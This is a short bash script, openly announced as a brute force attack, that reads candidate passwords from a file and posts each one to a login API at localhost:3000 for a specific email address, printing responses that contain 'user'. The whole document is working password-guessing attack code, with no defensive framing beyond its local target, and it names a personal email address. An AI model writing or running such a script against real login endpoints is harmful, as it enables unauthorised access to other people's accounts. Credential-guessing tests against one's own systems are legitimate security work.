#!/bin/bash

echo "Starting brute force attack..."

while read -r password; do
    echo "Trying: $password"
    curl -s -X POST "http://localhost:3000/api/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"mahmoudhesham99199@gmail.com\",\"password\":\"$password\"}" \
        | grep "user"
done < password.txt

echo "Attack finished."